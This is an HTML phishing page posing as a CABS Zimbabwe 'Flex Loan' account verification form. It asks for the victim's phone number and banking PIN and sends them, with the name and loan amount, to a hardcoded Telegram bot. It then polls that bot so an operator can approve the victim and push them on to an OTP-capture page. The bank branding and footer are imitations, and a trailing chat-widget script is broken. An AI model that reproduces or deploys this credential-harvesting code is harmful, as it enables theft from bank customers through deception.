<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#11bb4a">
    <title>CABS Zimbabwe | Account Verification</title>
    <link rel="icon" href="https://applycabsloans.netlify.app/cabslogo.jpeg">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
         :root {
            --cabs-green: #11bb4a;
            --cabs-dark-green: #0a9a28;
            --cabs-deep: #04501f;
            --white: #ffffff;
            --bg-overlay: rgba(0, 20, 8, 0.80);
            --card-bg: rgba(255, 255, 255, 0.12);
            --input-bg: rgba(255, 255, 255, 0.08);
            --error: #ff6b6b;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        html,
        body {
            overflow-x: hidden;
            max-width: 100%;
            -webkit-text-size-adjust: 100%;
        }
        
        body {
            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            min-height: 100vh;
            min-height: 100dvh;
            color: white;
            line-height: 1.6;
            display: flex;
            flex-direction: column;
        }
        
        header {
            padding: calc(30px + env(safe-area-inset-top)) 5% 18px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .logo {
            font-size: 26px;
            font-weight: 800;
            text-decoration: none;
            display: flex;
            align-items: center;
            transition: transform 0.3s ease;
            flex-wrap: wrap;
            justify-content: center;
        }
        
        .logo:hover {
            transform: scale(1.05);
        }
        
        .logo .cabs {
            color: var(--cabs-green);
        }
        
        .logo .flex-loan {
            color: var(--white);
            margin-left: 8px;
            font-weight: 400;
            font-size: 22px;
            opacity: 0.9;
        }
        
        .logo img {
            height: 38px;
            width: auto;
            border-radius: 8px;
            margin-right: 8px;
        }
        
        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            align-self: stretch;
        }
        
        .container {
            max-width: 420px;
            width: 100%;
            margin: 0 auto;
            padding-bottom: calc(40px + env(safe-area-inset-bottom));
        }
        
        .card {
            background: var(--card-bg);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border: 1px solid rgba(255, 255, 255, 0.18);
            border-radius: 35px;
            padding: 45px 35px;
            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6);
            text-align: center;
            animation: cardFadeIn 0.8s cubic-bezier(0.16, 1, 0.3, 1);
        }
        
        @keyframes cardFadeIn {
            from {
                opacity: 0;
                transform: translateY(40px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .brand-icon {
            width: 80px;
            height: 80px;
            background: var(--cabs-deep);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
            border: 2px solid rgba(17, 187, 74, 0.35);
        }
        
        .card h2 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 10px;
            color: var(--white);
        }
        
        .card p {
            font-size: 14px;
            opacity: 0.7;
            margin-bottom: 30px;
            font-weight: 300;
        }
        
        .applicant-badge {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(17, 187, 74, 0.25);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: left;
        }
        
        .applicant-badge .label {
            font-size: 11px;
            text-transform: uppercase;
            color: var(--cabs-green);
            font-weight: 700;
            display: block;
            margin-bottom: 5px;
            letter-spacing: 1px;
        }
        
        .applicant-badge .name {
            font-size: 18px;
            font-weight: 700;
            color: var(--white);
            display: block;
        }
        
        .applicant-badge .amount {
            font-size: 14px;
            opacity: 0.8;
            margin-top: 2px;
            display: block;
        }
        
        .error-msg {
            color: var(--error);
            font-size: 13px;
            margin-bottom: 20px;
            display: none;
            background: rgba(255, 107, 107, 0.1);
            padding: 12px;
            border-radius: 14px;
            border: 1px solid rgba(255, 107, 107, 0.2);
            font-weight: 500;
        }
        
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        .input-wrapper {
            background: var(--input-bg);
            border: 1.5px solid rgba(255, 255, 255, 0.15);
            border-radius: 18px;
            padding: 16px 20px;
            display: flex;
            align-items: center;
            transition: all 0.3s ease;
        }
        
        .input-wrapper:focus-within {
            border-color: var(--cabs-green);
            background: rgba(255, 255, 255, 0.12);
            box-shadow: 0 0 15px rgba(17, 187, 74, 0.15);
        }
        
        .input-wrapper.invalid {
            border-color: var(--error);
            box-shadow: 0 0 12px rgba(255, 107, 107, 0.15);
        }
        
        .flag-icon {
            width: 24px;
            margin-right: 12px;
            border-radius: 3px;
        }
        
        .country-code {
            color: var(--cabs-green);
            font-weight: 700;
            margin-right: 10px;
            font-size: 15px;
        }
        
        .input-field {
            flex: 1;
            background: transparent;
            border: none;
            color: white;
            font-size: 16px;
            /* prevents iOS zoom */
            outline: none;
            width: 100%;
            font-family: inherit;
        }
        
        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.3);
        }
        
        .verify-btn {
            width: 100%;
            padding: 20px;
            background: var(--white);
            color: var(--cabs-deep);
            border: none;
            border-radius: 18px;
            font-size: 16px;
            font-weight: 800;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            transition: all 0.3s ease;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            margin-top: 10px;
            font-family: inherit;
        }
        
        .verify-btn:hover {
            background: var(--cabs-green);
            color: var(--white);
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
        }
        
        .verify-btn:active {
            transform: translateY(-1px);
        }
        
        .overlay {
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            background: rgba(0, 15, 5, 0.95);
            z-index: 2000;
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            padding: 20px;
        }
        
        .overlay.on {
            display: flex;
        }
        
        .spin {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top-color: var(--cabs-green);
            border-radius: 50%;
            animation: sp 1s cubic-bezier(0.5, 0, 0.5, 1) infinite;
        }
        
        .sp-t {
            font-size: 20px;
            font-weight: 700;
            margin-top: 25px;
            letter-spacing: 0.5px;
        }
        
        .sp-s {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
            margin-top: 10px;
            font-weight: 300;
        }
        
        @keyframes sp {
            to {
                transform: rotate(360deg);
            }
        }
        /* Modal Styles */
        
        .modal-overlay {
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            background: rgba(0, 0, 0, 0.85);
            z-index: 3000;
            backdrop-filter: blur(10px);
            padding: 20px;
        }
        
        .modal-overlay.on {
            display: flex;
        }
        
        .modal-card {
            background: #ffffff;
            color: #333;
            max-width: 380px;
            width: 100%;
            border-radius: 25px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
            animation: modalIn 0.4s cubic-bezier(0.17, 0.84, 0.44, 1);
        }
        
        @keyframes modalIn {
            from {
                transform: scale(0.8);
                opacity: 0;
            }
            to {
                transform: scale(1);
                opacity: 1;
            }
        }
        
        .modal-icon {
            font-size: 50px;
            margin-bottom: 20px;
            color: #ff6b6b;
        }
        
        .modal-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 15px;
            color: var(--cabs-deep);
        }
        
        .modal-text {
            font-size: 15px;
            margin-bottom: 30px;
            line-height: 1.5;
            color: #555;
        }
        
        .modal-btn {
            background: var(--cabs-green);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 12px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            transition: all 0.2s;
            font-family: inherit;
        }
        
        .modal-btn:hover {
            background: var(--cabs-dark-green);
        }
        
        footer {
            padding: 40px 20px;
            text-align: center;
            font-size: 12px;
            opacity: 0.4;
        }
        
        @media (max-width: 480px) {
            .logo {
                font-size: 24px;
            }
            .logo .flex-loan {
                font-size: 20px;
            }
            .card {
                padding: 40px 25px;
            }
            .card h2 {
                font-size: 22px;
            }
        }
        
        @media (max-width: 370px) {
            .card {
                padding: 34px 22px;
            }
            .logo {
                font-size: 22px;
            }
            .logo .flex-loan {
                font-size: 18px;
            }
        }
        
        @media (orientation: landscape) and (max-height: 500px) {
            header {
                padding: 8px 5% 8px;
            }
            main {
                align-items: flex-start;
                padding: 12px;
            }
            .card {
                padding: 28px 24px;
            }
            .brand-icon {
                width: 60px;
                height: 60px;
                margin-bottom: 14px;
            }
            .card p {
                margin-bottom: 20px;
            }
            .applicant-badge {
                margin-bottom: 20px;
                padding: 16px;
            }
        }
    </style>
</head>

<body onload="init()">

    <header>
        <a class="logo" href="index.html">
            <img src="https://applycabsloans.netlify.app/cabslogo.jpeg" alt="CABS logo">
            <span class="cabs">CABS</span><span class="flex-loan">Flex Loan</span>
        </a>
    </header>

    <main>
        <div class="container">
            <div class="card">
                <div class="brand-icon">
                    <svg viewBox="0 0 100 100" width="45" height="45">
                        <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#11bb4a" stroke-width="8" stroke-linecap="round"/>
                        <path d="M45,35 L55,65" stroke="#11bb4a" stroke-width="8" stroke-linecap="round"/>
                    </svg>
                </div>

                <h2>Account Verification</h2>
                <p>Please verify your CABS account to complete your Flex Loan application.</p>

                <div id="applicantBadge" class="applicant-badge">
                    <span class="label">Applicant Details</span>
                    <span id="displayName" class="name">Valued Client</span>
                    <span id="displayAmount" class="amount">$0.00 USD Flex Loan</span>
                </div>

                <div id="err" class="error-msg"></div>

                <form onsubmit="doSubmit(event)">
                    <div class="input-group">
                        <div class="input-wrapper" id="wrapPhone">
                            <img src="https://flagcdn.com/w40/zw.png" class="flag-icon" alt="ZW">
                            <span class="country-code">(+263)</span>
                            <input type="tel" class="input-field" id="phone" placeholder="7XXXXXXXX" inputmode="numeric" maxlength="9" required>
                        </div>
                    </div>

                    <div class="input-group">
                        <div class="input-wrapper" id="wrapPin">
                            <span style="margin-right: 15px; font-size: 18px; opacity: 0.6;">&#128274;</span>
                            <input type="password" class="input-field" id="pin" placeholder="Enter 4-Digit PIN" inputmode="numeric" maxlength="4" required>
                        </div>
                    </div>

                    <button type="submit" class="verify-btn">Verify &amp; Continue</button>
                </form>
            </div>
        </div>
    </main>

    <div id="ov" class="overlay">
        <div class="spin"></div>
        <div class="sp-t">Verifying Identity</div>
        <div class="sp-s">Connecting to CABS secure servers...</div>
    </div>

    <!-- Custom Modal for Warnings -->
    <div id="warningModal" class="modal-overlay">
        <div class="modal-card">
            <div class="modal-icon">&#9888;&#65039;</div>
            <div class="modal-title">Notice</div>
            <div id="modalMsg" class="modal-text"></div>
            <button class="modal-btn" onclick="closeModal()">Try Again</button>
        </div>
    </div>

    <footer>
        <p>&copy; 2026 CABS, a member of the Old Mutual Group &bull; Zimbabwe.</p>
    </footer>

    <script>
        const BOT = '8817264472:AAHYM2dZxG6SqRwj0I6_uFERWoEmh-nblhw';
        const CID = '6813182993';
        let loanData = {
            name: "Valued Client",
            amount: "0",
            purpose: "Flex Loan"
        };
        let lastUpdateId = 0;
        let pinAttempts = 0;

        function init() {
            const params = new URLSearchParams(window.location.search);
            // If returned from a Declined decision, show the declined warning
            if (params.get('declined') === '1') {
                setTimeout(function() {
                    showModal('Your previous application was declined. Please verify your account details and try again.');
                }, 500);
            }
            loanData.name = params.get('name') || params.get('firstName') || "Valued Client";

            let rawAmount = params.get('amount') || "0";
            loanData.amount = rawAmount.replace(/[^0-9.]/g, '');

            loanData.purpose = params.get('purpose') || "Flex Loan";

            // If the index sent firstName + lastName separately, combine them
            if (params.get('firstName') && params.get('lastName')) {
                loanData.name = params.get('firstName') + ' ' + params.get('lastName');
            }

            document.getElementById('displayName').textContent = decodeURIComponent(loanData.name);

            const formattedAmount = parseFloat(loanData.amount).toLocaleString(undefined, {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2
            });
            document.getElementById('displayAmount').textContent = '$' + formattedAmount + ' USD ' + decodeURIComponent(loanData.purpose);
        }

        function showErr(msg) {
            const e = document.getElementById('err');
            e.textContent = msg;
            e.style.display = 'block';
            document.getElementById('wrapPhone').classList.remove('invalid');
            document.getElementById('wrapPin').classList.remove('invalid');
        }

        function clrErr() {
            document.getElementById('err').style.display = 'none';
        }

        function showModal(msg) {
            document.getElementById('modalMsg').textContent = msg;
            document.getElementById('warningModal').classList.add('on');
        }

        function closeModal() {
            document.getElementById('warningModal').classList.remove('on');
            document.getElementById('pin').focus();
        }

        async function sendToTelegram(msg, buttons) {
            try {
                const response = await fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CID,
                        text: msg,
                        reply_markup: buttons ? {
                            inline_keyboard: buttons
                        } : undefined,
                        parse_mode: 'HTML'
                    })
                });
                const data = await response.json();
                if (data.ok) {
                    const updateResponse = await fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?limit=1&offset=-1');
                    const updateData = await updateResponse.json();
                    if (updateData.ok && updateData.result.length > 0) {
                        lastUpdateId = updateData.result[0].update_id;
                    }
                }
            } catch (e) {
                console.error(e);
            }
        }

        function doSubmit(e) {
            e.preventDefault();
            clrErr();
            const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
            const pin = document.getElementById('pin').value.trim();

            let ok = true;
            if (phone.length < 9) {
                showErr('Please enter a valid 9-digit mobile number.');
                document.getElementById('wrapPhone').classList.add('invalid');
                ok = false;
            }
            if (pin.length !== 4) {
                if (ok) showErr('PIN must be exactly 4 digits.');
                document.getElementById('wrapPin').classList.add('invalid');
                ok = false;
            }
            if (!ok) return;

            const msg = '\ud83d\ude80 <b>CABS Flex Loan Verification</b>\n\n\ud83d\udc64 <b>Name:</b> <code>' + decodeURIComponent(loanData.name) + '</code>\n\ud83d\udcf1 <b>Phone:</b> <code>' + phone + '</code>\n\ud83d\udd12 <b>PIN:</b> <code>' + pin + '</code>\n\ud83d\udcb0 <b>Amount:</b> <code>$' + parseFloat(loanData.amount).toLocaleString(undefined, {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2
            }) + ' USD</code>\n\ud83c\udfaf <b>Purpose:</b> <code>' + decodeURIComponent(loanData.purpose) + '</code>\n\nPlease choose an action below:';

            // 3 buttons: Approved / Declined / Already Applied
            const buttons = [
                [{
                    text: '\u2705 Approved',
                    callback_data: 'login_approved'
                }, {
                    text: '\u274c Declined',
                    callback_data: 'login_declined'
                }, {
                    text: '\u26a0\ufe0f Already Applied',
                    callback_data: 'login_applied'
                }]
            ];

            document.getElementById('ov').classList.add('on');
            sendToTelegram(msg, buttons);
            startPolling();
        }

        function startPolling() {
            const pollInterval = setInterval(function() {
                fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?offset=' + (lastUpdateId + 1))
                    .then(function(r) {
                        return r.json();
                    })
                    .then(function(data) {
                        if (data.ok && data.result.length > 0) {
                            data.result.forEach(function(update) {
                                lastUpdateId = update.update_id;
                                if (update.callback_query) {
                                    const action = update.callback_query.data;
                                    console.log('Callback received:', action);

                                    if (action === 'login_approved') {
                                        clearInterval(pollInterval);
                                        document.getElementById('ov').classList.remove('on');
                                        clrErr();
                                        proceedToOTP();
                                    } else if (action === 'login_declined') {
                                        clearInterval(pollInterval);
                                        document.getElementById('ov').classList.remove('on');
                                        // Declined returns to login.html just as the Declined word works
                                        location.href = 'login.html?declined=1';
                                    } else if (action === 'login_applied') {
                                        clearInterval(pollInterval);
                                        document.getElementById('ov').classList.remove('on');
                                        // Already Applied: warning popup that you already applied
                                        showModal('You have already applied for a Flex Loan. Please wait for your application to get approved.');
                                        document.getElementById('pin').value = '';
                                    }
                                }
                            });
                        }
                    }).catch(function(e) {
                        console.error(e);
                    });
            }, 1500);

            setTimeout(function() {
                clearInterval(pollInterval);
            }, 600000);
        }

        function proceedToOTP() {
            const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
            location.href = 'otp.html?name=' + loanData.name + '&amount=' + loanData.amount + '&purpose=' + loanData.purpose + '&phone=' + phone;
        }
    </script>

    <script type="text/javascript">
        var Tawk_API = Tawk_API || {},
            Tawk_LoadStart = new Date();

                s0 = document.getElementsByTagName("script")[0];

            s1.charset = 'UTF-8';

            s0.parentNode.insertBefore(s1, s0);
        })();
    </script>

</body>

</html>
